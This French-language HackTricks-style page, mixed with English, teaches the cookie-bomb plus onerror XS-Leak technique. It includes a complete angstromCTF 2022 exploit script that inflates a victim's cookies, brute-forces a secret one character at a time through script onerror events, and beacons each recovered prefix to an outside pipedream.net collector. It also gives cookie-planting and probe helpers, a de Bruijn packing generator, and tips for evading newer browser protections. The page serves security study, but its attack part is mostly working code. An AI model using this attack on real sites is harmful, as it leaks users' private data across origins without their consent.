# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Cette technique combine :
- Cookie bombing : remplir le navigateur de la victime avec de nombreux/gros cookies pour l'origine cible afin que les requêtes suivantes atteignent les limites du serveur/de la requête (taille des en-têtes de requête, taille de l'URL dans les redirections, etc.).
- Error-event oracle : sonder un endpoint cross-origin avec un `<script>` (ou une autre sous-ressource) et distinguer les états avec `onload` vs `onerror`.

Idée générale
- Trouver un endpoint cible dont le comportement diffère selon deux états que vous voulez tester (par ex., recherche “hit” vs “miss”).
- S'assurer que le chemin “hit” déclenchera une chaîne de redirections lourde ou une URL longue tandis que le chemin “miss” reste court. Gonfler les en-têtes de requête en ajoutant de nombreux cookies de sorte qu'un seul chemin (le “hit”) fasse dépasser le serveur ses limites et retourne une erreur HTTP (par ex., 431/414/400). L'erreur inverse l'événement `onerror` et devient un oracle pour XS-Search.

Quand cela fonctionne
- Vous pouvez amener le navigateur de la victime à envoyer des cookies à la cible (par ex., les cookies sont SameSite=None ou vous pouvez les définir en contexte first-party via un popup `window.open`).
- Il existe une fonctionnalité de l'app que vous pouvez abuser pour définir des cookies arbitraires (par ex., des endpoints “save preference” qui transforment des noms/valeurs d'entrée contrôlés en Set-Cookie) ou pour effectuer des redirections post-auth qui incorporent des données contrôlées par l'attaquant dans l'URL.
- Le serveur réagit différemment selon les deux états et, avec des en-têtes/URL gonflés, un état dépasse une limite et renvoie une réponse d'erreur qui déclenche `onerror`.

Remarque sur les erreurs serveur utilisées comme oracle
- 431 Request Header Fields Too Large est couramment renvoyé lorsque les cookies gonflent les en-têtes de requête ; 414 URI Too Long ou un 400 spécifique au serveur peuvent être renvoyés pour des cibles de requête longues. Chacune de ces réponses entraîne un échec du chargement de la sous-ressource et déclenche `onerror`. Voir [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) pour des causes typiques comme des cookies excessifs.

<details>
<summary>Exemple pratique (angstromCTF 2022)</summary>

Le script suivant (tiré d'un writeup public) abuse d'une fonctionnalité qui permet à l'attaquant d'insérer des cookies arbitraires, puis charge un endpoint de recherche cross-origin en tant que script. Quand la requête est correcte, le serveur effectue une redirection qui, combinée à la surcharge de cookies, dépasse les limites du serveur et renvoie un statut d'erreur, donc `script.onerror` se déclenche ; sinon, rien ne se passe.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
</details>

Pourquoi le popup (`window.open`) ?
- Les navigateurs modernes bloquent de plus en plus les third-party cookies. Ouvrir une fenêtre top-level vers la cible rend les cookies first‑party, donc les réponses Set-Cookie de la cible seront conservées, ce qui permet l'étape cookie-bomb même avec des restrictions sur les third‑party cookies.

2024–2025 notes on cookie availability
- Chrome’s Tracking Protection rollout (January 2024) bloque déjà les third-party cookies pour un cohort aléatoire et doit s'étendre à l'ensemble des utilisateurs une fois que la UK CMA donnera son accord, donc considérez qu'une victime peut soudainement perdre les 3P cookies. Automatisez le fallback : détectez quand votre script probe échoue sans jamais atteindre la cible et pivotez de façon transparente vers le flux popup/first-party. Safari et Firefox bloquent déjà la plupart des third-party cookies par défaut et CHIPS/partitioned cookies signifient que chaque top-level site a désormais son propre jar.
- Utilisez un first‑party cookie planting flow (`window.open` + auto-submit to a cookie-setting endpoint) puis probez avec une subresource qui ne réussit que lorsque ces cookies sont envoyés. Si les third‑party cookies sont bloqués, déplacez la probe dans un contexte same-site (par ex., exécutez l'oracle dans le popup via un gadget same-site et exfiltrez le booléen avec `postMessage` ou un beacon vers votre serveur), ou inscrivez l'origine victime dans le Chrome’s deprecation trial si vous la contrôlez légitimement.

<details>
<summary>Tracking-Protection-safe first-party planting helper</summary>

Quand vous devez insérer des dizaines de cookies depuis un contexte cross-site, créez une fenêtre top-level temporaire et déclenchez une série de soumissions de formulaires surdimensionnés vers l'endpoint vulnérable de Set-Cookie :
```js
async function plantFirstPartyCookies(endpoint, fields) {
for (let i = 0; i < 5; i++) {
const name = crypto.randomUUID();
const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
Object.entries(fields).forEach(([k, v]) => {
const input = document.createElement('input');
input.name = k;
input.value = v + '_'.repeat(400 + 120 * i);
form.appendChild(input);
});
document.body.appendChild(form);
window.open('about:blank', name, 'noopener');
form.submit();
await new Promise(r => setTimeout(r, 120));
form.remove();
}
}
```
Appelez-le juste avant de commencer probing afin que chaque oracle run commence avec un freshly inflated cookie jar.

</details>

Aide de probing générique
Si vous avez déjà un moyen de définir de nombreux cookies sur l'origine cible (first-party), vous pouvez réutiliser cet oracle minimal contre n'importe quel endpoint dont la réussite/échec entraîne des résultats réseau différents (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Oracle de tag alternatif (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Avancé : de Bruijn–based cookie packing (CTF-proven)
- Si l'application vous permet de contrôler de grandes valeurs de cookie, vous pouvez packer les guesses efficacement en ajoutant une de Bruijn sequence à chaque probe. Cela réduit l'overhead par probe tout en garantissant que la heavy branch est systématiquement plus lourde uniquement pour le bon prefix. Exemple de générateur pour |Σ| symbols de longueur n (tient dans une cookie value) :
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idée en pratique : set multiple cookies whose values are prefix + deBruijn(k,n). Ce n'est que lorsque le prefix testé est correct que le serveur emprunte la branche lourde (par ex., un extra redirect reflétant le long cookie ou URL), ce qui, combiné au cookie bloat, dépasse les limites et active onerror. Voir un public solver LA CTF 2024 utilisant cette approche.

Tips to build the oracle
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Servers commonly cap header size and will fail sooner when many cookies are present.
- Stabilize: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.
- Bust caches and avoid pooling artifacts: add a random `#fragment` or `?r=` to probe URLs, and prefer distinct window names when using `window.open` loops.
- Alternate subresources: if `<script>` is filtered, try `<link rel=stylesheet>` or `<img>`. The onload/onerror boolean is the oracle; content never needs to be parsed.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs and servers enforce different caps. As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize) are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly (see [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).

Browser hardening watchlist (2025+)
- Firefox 139/ESR 128.11 (May 2025) tightened script tag load/error accounting for cross-origin resources (CVE-2025-5266). On patched clients the `onerror` signal for certain redirected responses is suppressed, so diversify the oracle (parallel `<link rel=stylesheet>`, `<img>`, or `fetch` with mismatched MIME) and fingerprint the victim UA before assuming the boolean still fires.
- Expect enterprise Chromium builds with Tracking Protection or Fetch Metadata policies to intermittently strip cookies or rewrite redirects. Detect these cases by probing a short endpoint first; when it fails, automatically pivot to running the entire attack inside the popup and relaying bits through `postMessage`/`BroadcastChannel`.

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## Références
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout details: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) tightening script tag onerror behavior: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
